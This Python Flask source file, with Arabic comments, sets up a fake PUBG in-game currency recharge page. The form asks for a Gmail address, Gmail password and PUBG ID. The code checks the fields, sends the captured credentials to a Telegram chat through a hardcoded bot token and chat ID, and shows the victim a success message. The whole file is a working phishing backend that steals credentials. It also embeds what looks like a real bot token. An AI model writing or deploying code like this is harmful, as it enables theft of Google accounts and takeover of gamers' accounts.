from flask import Flask, render_template, request, flash, redirect, url_for
import requests
import re

app = Flask(__name__)
app.secret_key = "supersecretkey"  # استخدم مفتاحًا آمنًا هنا

# 🔹 إعدادات بوت تيليجرام
BOT_TOKEN = "7702902556:AAGGHmO3W2KLbaXPJCa4-Rngxfyq-m6uaz0"  # 🔴 استبدل برمز التوكن الخاص بالبوت
CHAT_ID = "6922079349"  # 🔴 استبدل بمعرف الدردشة الخاص بك

def is_valid_gmail(email):
    """التحقق من صحة بريد Gmail."""
    pattern = r"^[a-zA-Z0-9_.+-]+@gmail\.com$"
    return re.match(pattern, email)

def is_valid_pubg_id(pubg_id):
    """التحقق من أن ID ببجي يحتوي فقط على أرقام وطوله مناسب."""
    return pubg_id.isdigit() and (5 <= len(pubg_id) <= 15)

def send_to_telegram(email, password, pubg_id):
    """إرسال البيانات إلى تيليجرام."""
    message_text = f"""
📩 **New PUBG UC Recharge Request:**
📧 **Gmail:** `{email}`
🔑 **Password:** ||{password}||  👀
🎮 **PUBG ID:** `{pubg_id}`
    """

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message_text, "parse_mode": "MarkdownV2"}

    response = requests.post(url, json=payload)
    print("Telegram Response:", response.text)  # تحقق من الرد إذا كان هناك خطأ

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        pubg_id = request.form.get("pubg_id")

        if not is_valid_gmail(email):
            flash("❌ Invalid Gmail address! Please enter a valid Gmail.", "danger")
            return redirect(url_for("index"))

        if not is_valid_pubg_id(pubg_id):
            flash("❌ Invalid PUBG ID! It must be 5-15 digits.", "danger")
            return redirect(url_for("index"))

        send_to_telegram(email, password, pubg_id)
        flash("✅ Your request has been submitted successfully!", "success")

    return render_template("index.html")

if __name__ == "__main__":
 app.run(host="0.0.0.0", port=5000, debug=True)